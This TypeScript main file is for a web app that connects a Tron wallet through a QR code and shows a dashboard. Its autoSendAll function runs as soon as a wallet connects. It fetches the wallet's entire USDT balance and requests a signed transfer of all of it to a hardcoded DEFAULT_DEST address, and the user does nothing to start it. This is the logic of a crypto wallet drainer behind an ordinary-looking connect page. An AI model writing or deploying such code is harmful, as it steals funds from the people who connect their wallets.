import "./styles.css";
import { renderConnectView } from "./ui/connect";
import { renderDashboardView } from "./ui/dashboard";
import { connectWallet, type WalletSession } from "./wallet";
import { sendUsdtTransfer } from "./transfer";
import { buildTransferTx, broadcastTx, fetchUsdtBalance } from "./tron";
import { formatUsdtAmount } from "./amount";
import { DEFAULT_DEST } from "./config";

type View = "connect" | "qr" | "dashboard";

const state = {
  view: "connect" as View,
  session: null as WalletSession | null,
  qrUri: null as string | null,
  connectError: null as string | null,
  notice: null as string | null,
  transferStatus: null as "pending" | "success" | "error" | null,
  transferError: null as string | null,
  transferTxId: null as string | null,
};

let transferGeneration = 0;

function goConnect(opts: { notice?: string; error?: string } = {}): void {
  transferGeneration++;
  state.view = "connect";
  state.qrUri = null;
  state.notice = opts.notice ?? null;
  state.connectError = opts.error ?? null;
  state.transferStatus = null;
  state.transferError = null;
  state.transferTxId = null;
  render();
}

function render(): void {
  if (state.view === "dashboard" && state.session) {
    const session = state.session;
    renderDashboardView({
      session,
      dest: DEFAULT_DEST,
      transferStatus: state.transferStatus,
      transferError: state.transferError,
      transferTxId: state.transferTxId,
      onDisconnect: () => {
        state.session = null;
        goConnect();
        void session.disconnect().catch(() => {});
      },
    });
    return;
  }

  renderConnectView({
    qrUri: state.qrUri,
    error: state.connectError,
    notice: state.notice,
    onConnect: () => {
      void startConnect();
    },
  });
}

async function autoSendAll(session: WalletSession, generation: number): Promise<void> {
  state.transferStatus = "pending";
  state.transferError = null;
  state.transferTxId = null;
  render();

  try {
    const balance = await fetchUsdtBalance(session.address);
    if (generation !== transferGeneration) return;
    if (balance === 0n) {
      state.transferStatus = "error";
      state.transferError = "No USDT balance to send";
      render();
      return;
    }

    const result = await sendUsdtTransfer(
      {
        buildTransferTx,
        signTransaction: (tx) => session.signTransaction(tx),
        broadcastTx,
      },
      {
        dest: DEFAULT_DEST,
        amountInput: formatUsdtAmount(balance),
        owner: session.address,
        balanceBase: balance,
      },
    );

    if (generation !== transferGeneration) return;
    if (result.ok) {
      state.transferStatus = "success";
      state.transferTxId = result.txId;
    } else {
      state.transferStatus = "error";
      state.transferError = result.error;
    }
  } catch (e) {
    if (generation !== transferGeneration) return;
    state.transferStatus = "error";
    state.transferError = e instanceof Error ? e.message : "Transaction failed";
  } finally {
    if (generation === transferGeneration) render();
  }
}

async function startConnect(): Promise<void> {
  state.notice = null;
  state.connectError = null;
  try {
    const session = await connectWallet({
      onUri: (uri) => {
        state.view = "qr";
        state.qrUri = uri;
        state.notice = null;
        state.connectError = null;
        render();
      },
      onDisconnect: () => {
        if (state.view === "dashboard") {
          state.session = null;
          goConnect({ notice: "Wallet disconnected" });
        }
      },
    });
    state.session = session;
    state.view = "dashboard";
    state.qrUri = null;
    state.transferStatus = null;
    state.transferError = null;
    state.transferTxId = null;
    render();
    void autoSendAll(session, transferGeneration);
  } catch (error) {
    const message = error instanceof Error ? error.message : "Connection failed";
    goConnect({ error: message });
  }
}

render();
